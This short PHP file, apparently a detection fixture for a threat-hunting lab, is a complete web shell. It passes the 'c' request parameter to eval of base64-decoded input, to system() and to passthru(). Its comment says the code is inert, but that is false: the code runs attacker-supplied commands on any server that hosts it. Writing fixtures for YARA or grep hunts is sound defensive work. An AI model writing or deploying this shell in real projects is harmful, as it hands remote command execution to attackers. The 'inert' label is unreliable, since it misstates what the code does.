<?php
/*
 * LAB SAMPLE — inert detection-test artifact for Class 11 threat hunting.
 * NOT a working shell in this lab context and must never be deployed.
 * It exists only so YARA / grep hunts have something realistic to match.
 */
if (isset($_GET["c"])) {
    // classic webshell primitives the hunt rule looks for
    eval(base64_decode($_GET["c"]));
    system($_GET["c"]);
    passthru($_GET["c"]);
}
?>
